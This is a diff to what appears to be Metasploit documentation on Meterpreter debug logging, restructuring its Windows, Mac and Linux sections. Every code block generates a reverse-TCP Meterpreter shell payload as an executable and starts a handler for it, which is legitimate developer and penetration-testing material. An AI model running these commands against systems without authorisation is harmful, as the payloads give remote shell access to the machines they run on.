@@ -80,26 +80,32 @@ php shell_http.php
 ```
 
 ### Windows
+
 ```
 use windows/x64/meterpreter_reverse_tcp
-set MeterpreterDebugBuild true
-set MeterpreterDebugLogging rpath:C:/test/foo.txt
-generate -f exe -o shell.exe
+generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/test/foo.txt'
+
 to_handler
 ```
 
-### Linux/Mac
+### Mac
+
 ```
 use osx/x64/meterpreter_reverse_tcp
 generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'
+
 to_handler
 ```
+
+### Linux
+
 ```
 use linux/x64/meterpreter_reverse_tcp
 generate -f elf -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'
+
 to_handler
 ```
 
 ### Java
 
-Not yet implemented
+Functionality not supported
